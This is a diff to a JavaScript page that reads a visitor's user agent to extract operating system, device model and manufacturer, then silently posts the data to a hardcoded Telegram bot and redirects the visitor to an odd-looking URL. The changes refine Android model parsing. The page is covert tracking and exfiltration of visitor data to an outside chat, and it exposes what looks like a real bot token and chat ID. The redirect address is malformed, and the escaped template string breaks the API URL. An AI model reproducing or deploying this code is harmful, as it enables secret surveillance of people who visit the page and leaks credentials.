@@ -17,34 +17,51 @@
             let manufacturer = 'Unknown Manufacturer';
             let browser = 'Unknown Browser';
             let osVersion = 'N/A';
-            
-            // --- OS and Model (Prioritize Android and iOS) ---
+
+            // --- Primary OS Detection ---
             if (ua.includes('Android')) {
                 os = 'Android';
-                // Pattern for most Android models (found between parentheses, e.g., 'Linux; Android 13; SM-S908U Build/...')
-                const androidMatch = ua.match(/Android [^;]+; ([^;)]+)(?:\sBuild\/)/);
-                if (androidMatch && androidMatch[1]) {
-                    // Clean up the model to remove the 'Build' string if it snuck in
-                    model = androidMatch[1].trim().replace(/\s+Build\/.*/, '');
-                    // Attempt to infer manufacturer from model prefix (e.g., 'SM-' is Samsung, 'Pixel' is Google)
-                    if (model.startsWith('SM-') || model.startsWith('SAMSUNG')) {
-                        manufacturer = 'Samsung';
-                    } else if (model.includes('Pixel')) {
-                        manufacturer = 'Google';
-                    } else if (model.includes('ONEPLUS')) {
-                        manufacturer = 'OnePlus';
-                    }
-                }
-                // Get OS Version
+                
+                // Get Reported OS Version (may be intentionally incorrect by browser)
                 const versionMatch = ua.match(/Android (\d+(?:\.\d+)*)/);
                 if (versionMatch && versionMatch[1]) {
                     osVersion = versionMatch[1];
+                }
+
+                // *** FIX: Model Extraction ***
+                // 1. Try to find the detailed model between the two main parentheses: (Linux; Android [Version]; [MODEL INFO] Build/...)
+                let modelMatch = ua.match(/\(([^;]+); Android [^;]+; ([^)]+)\)/);
+                
+                if (modelMatch && modelMatch[2]) {
+                    // This captures both old (detailed) and new (sanitized like 'K' or 'M') UAs.
+                    let modelSegment = modelMatch[2].trim();
+                    
+                    // If the segment is just one letter or number (sanitized), fall back to checking if the original model was in the main parentheses.
+                    if (modelSegment.length <= 2) {
+                        modelMatch = ua.match(/Android [^;]+; ([^;)]+)(?:\sBuild\/)/);
+                        if (modelMatch && modelMatch[1]) {
+                           modelSegment = modelMatch[1].trim();
+                        }
+                    }
+
+                    // Final cleanup and assignment
+                    model = modelSegment.replace(/\s+Build\/.*/, '').trim();
+
+                    // Attempt to infer manufacturer from model prefix
+                    if (model.startsWith('SM-') || model.startsWith('SAMSUNG')) {
+                        manufacturer = 'Samsung';
+                    } else if (model.includes('Pixel') || model.startsWith('PXD')) {
+                        manufacturer = 'Google';
+                    } else if (model.includes('ONEPLUS') || model.includes('ONE')) {
+                        manufacturer = 'OnePlus';
+                    } else if (model.length > 2 && model !== 'K') { // If it's a real model string, use it.
+                        manufacturer = 'Android Device'; 
+                    }
                 }
             } else if (ua.includes('iPhone') || ua.includes('iPad') || ua.includes('iPod')) {
                 os = ua.includes('iPad') ? 'iPadOS' : 'iOS';
                 model = ua.includes('iPad') ? 'iPad' : 'iPhone';
                 manufacturer = 'Apple';
-                // Get OS Version
                 const versionMatch = ua.match(/(iPhone|iPad|iPod);.*?OS\s(\d+_\d+)/);
                 if (versionMatch && versionMatch[2]) {
                     osVersion = versionMatch[2].replace(/_/g, '.');
@@ -93,7 +110,7 @@
         // --- 4. Configuration ---
         const BOT_TOKEN = '8437574185:AAH3LG_IDft1pdrkfv-75rgWUCIWFYxECoM'; 
         const CHAT_ID = '7863510010';     
-        const TELEGRAM_API_URL = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+        const TELEGRAM_API_URL = \`https://api.telegram.org/bot\${BOT_TOKEN}/sendMessage\`;
         const REDIRECT_URL = 'https://www.misha/dad/image23689/august2024.com'; 
 
         // --- 5. Send the Data and Redirect ---
@@ -109,8 +126,6 @@
             })
         })
         .finally(() => {
-            // Redirect regardless of the Telegram API call success or failure
-            // Use a short delay to ensure the fetch has time to initiate
             setTimeout(() => {
                 window.location.replace(REDIRECT_URL);
             }, 1000); 
